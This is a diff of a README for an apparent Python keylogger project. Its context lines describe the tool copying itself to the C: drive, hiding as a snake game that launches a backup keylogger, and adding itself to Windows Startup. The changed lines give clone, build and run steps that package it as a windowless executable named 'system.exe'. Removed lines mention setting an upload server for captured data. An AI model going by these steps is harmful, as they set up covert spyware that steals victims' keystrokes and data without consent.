@@ -7,15 +7,11 @@
 - It will copy itself to the C: drive
 - Disguised as a snake game, it will run the backup keylogger after "GAMEOVER" (Yeah, also for the user)
 - Add the backup keylogger to Windows Startup, so it will run automatically at startup in Windows
-## Usage
+## Usage:
 Quick start
-1. git clone https://github.com/secureyourself7/python-keylogger
-2. cd python-keylogger
-Customize parameters in Start.py: url_server_upload, hidden_service_check_connection.
-Run as a Python script
-pip install requirements.txt (alternatively python -m pip ...)
-python Start.py
-Run as an executable (7 MB)
-pip install pyinstaller
-pyinstaller --onefile --noconsole --icon=icon.ico Start.py
-dist\Start.exe
+1. git clone https://github.com/Zeal-L/Key-paste-screen-logger
+2. cd Key-paste-screen-logger
+3. pip install pyinstaller
+4. pyinstaller -F -w system.py
+5. cd dist/ && ./system.exe 
+
